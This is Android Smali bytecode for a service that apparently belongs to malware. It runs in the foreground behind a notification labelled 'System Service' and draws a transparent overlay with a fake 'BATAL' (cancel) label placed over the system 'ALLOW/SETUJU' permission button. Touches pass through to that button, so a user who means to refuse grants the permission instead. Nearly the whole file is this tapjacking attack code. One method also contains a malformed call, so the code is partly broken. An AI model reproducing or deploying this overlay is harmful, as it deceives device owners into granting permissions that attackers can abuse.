.class public Lcom/ddl/OverlayService;
.super Landroid/app/Service;
.source "OverlayService.java"

# WindowManager instance
.field private wm:Landroid/view/WindowManager;
# The fake overlay view
.field private overlayView:Landroid/view/View;

# ─── onCreate ────────────────────────────────────────────────
.method public onCreate()V
    .locals 0
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    invoke-direct {p0}, Lcom/ddl/OverlayService;->startAsForeground()V
    return-void
.end method

# ─── onStartCommand ──────────────────────────────────────────
.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    invoke-direct {p0}, Lcom/ddl/OverlayService;->showOverlay()V
    const/4 v0, 0x1         # START_STICKY
    return v0
.end method

# ─── onBind ──────────────────────────────────────────────────
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

# ─── startAsForeground ───────────────────────────────────────
.method private startAsForeground()V
    .locals 5

    # Create notification channel (Android 8+)
    :try_start_0
    const-string v0, "ddl_ch"
    const-string v1, "System"
    const/4 v2, 0x3         # IMPORTANCE_DEFAULT
    new-instance v3, Landroid/app/NotificationChannel;
    invoke-direct {v3, v0, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    invoke-virtual {p0}, Lcom/ddl/OverlayService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    # arg: "notification"
    const-string v4, "notification"
    invoke-virtual {p0, v4}, Lcom/ddl/OverlayService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v4
    check-cast v4, Landroid/app/NotificationManager;
    invoke-virtual {v4, v3}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :skip_channel

    :skip_channel
    # Build minimal notification
    new-instance v0, Landroid/app/Notification$Builder;
    const-string v1, "ddl_ch"
    invoke-direct {v0, p0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const-string v1, "System Service"
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    move-result-object v0

    const-string v1, "Running..."
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    move-result-object v0

    # Use system icon 0x0108006a = android.R.drawable.ic_dialog_info
    const v1, 0x0108006a
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;
    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;
    move-result-object v1

    const/4 v2, 0x1
    invoke-virtual {p0, v2, v1}, Lcom/ddl/OverlayService;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method

# ─── showOverlay ─────────────────────────────────────────────
# Adds a full-screen transparent WindowManager overlay.
# On top of it we place a fake "BATAL" TextView positioned
# to cover the system "ALLOW/SETUJU" button.
.method private showOverlay()V
    .locals 9

    # wm = getSystemService("window")
    const-string v0, "window"
    invoke-virtual {p0, v0}, Lcom/ddl/OverlayService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/view/WindowManager;
    iput-object v0, p0, Lcom/ddl/OverlayService;->wm:Landroid/view/WindowManager;

    # container = new FrameLayout(this)
    new-instance v1, Landroid/widget/FrameLayout;
    invoke-direct {v1, p0}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    # fake button = new TextView(this)
    new-instance v2, Landroid/widget/TextView;
    invoke-direct {v2, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    # setText("BATAL")  ← visually says cancel, physically over ALLOW
    const-string v3, "BATAL"
    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    # setTextColor(WHITE)
    const v3, 0xFFFFFFFF
    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTextColor(I)V

    # setTextSize(16f)
    const v3, 0x41800000    # 16.0f
    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTextSize(F)V

    # Background: semi-transparent grey  0x88_33_33_33
    const v3, 0x88333333
    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setBackgroundColor(I)V

    # setPadding(24,12,24,12)
    const/16 v3, 0x18   # 24px
    const/16 v4, 0x0C   # 12px
    invoke-virtual {v2, v3, v4, v3, v4}, Landroid/widget/TextView;->setPadding(IIII)V

    # --- FrameLayout.LayoutParams to position fake btn ---
    # Width=200dp, Height=WRAP_CONTENT
    new-instance v3, Landroid/widget/FrameLayout$LayoutParams;
    const/16 v4, 0xC8    # 200px width
    const/4  v5, -0x2    # WRAP_CONTENT = -2
    # gravity = BOTTOM|END = 0x55
    const/16 v6, 0x55
    invoke-direct {v3, v4, v5, v6}, Landroid/widget/FrameLayout$LayoutParams;-><init>(III)V

    # bottomMargin = 80px (approximate ALLOW button Y from bottom)
    const/16 v4, 0x50
    iput v4, v3, Landroid/view/ViewGroup$MarginLayoutParams;->bottomMargin:I

    # rightMargin = 24px
    const/16 v4, 0x18
    iput v4, v3, Landroid/view/ViewGroup$MarginLayoutParams;->rightMargin:I

    invoke-virtual {v1, v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    # --- WindowManager.LayoutParams ---
    new-instance v3, Landroid/view/WindowManager$LayoutParams;

    # TYPE: SDK >= 26 → TYPE_APPLICATION_OVERLAY(2038), else TYPE_PHONE(3)
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v5, 0x1A       # 26
    const/16 v6, 0x7F6      # 2038 TYPE_APPLICATION_OVERLAY
    const/4  v7, 0x3        # TYPE_PHONE = 3
    if-lt v4, v5, :use_phone_type
    move v7, v6
    :use_phone_type

    # FLAGS: NOT_FOCUSABLE(8) | LAYOUT_IN_SCREEN(0x100) | NOT_TOUCHABLE(0x10) 
    # NOT_TOUCHABLE so real touches pass through to underlying ALLOW btn
    const v4, 0x118
    # PixelFormat.TRANSLUCENT = -3
    const/4 v5, -0x3

    # WLP(type, flags, format)
    invoke-direct {v3, v7, v4, v5}, Landroid/view/WindowManager$LayoutParams;-><init>(III)V

    # MATCH_PARENT width/height
    const/4 v4, -0x1
    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->width:I
    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->height:I

    # gravity = 0 (fill)
    const/4 v4, 0x0
    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->gravity:I

    iput-object v1, p0, Lcom/ddl/OverlayService;->overlayView:Landroid/view/View;

    :try_add
    invoke-interface {v0, v1, v3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void

    .catch Ljava/lang/Exception; {:try_add .. :try_add} :err
    :err
    return-void
.end method

# ─── hideOverlay ─────────────────────────────────────────────
.method public hideOverlay()V
    .locals 2
    iget-object v0, p0, Lcom/ddl/OverlayService;->wm:Landroid/view/WindowManager;
    iget-object v1, p0, Lcom/ddl/OverlayService;->overlayView:Landroid/view/View;
    if-eqz v0, :done
    if-eqz v1, :done
    :try_rm
    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V
    :done
    return-void
    .catch Ljava/lang/Exception; {:try_rm .. :done} :done
.end method

# ─── onDestroy ───────────────────────────────────────────────
.method public onDestroy()V
    .locals 0
    invoke-direct {p0}, Lcom/ddl/OverlayService;->hideOverlay()V
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V
    return-void
.end method
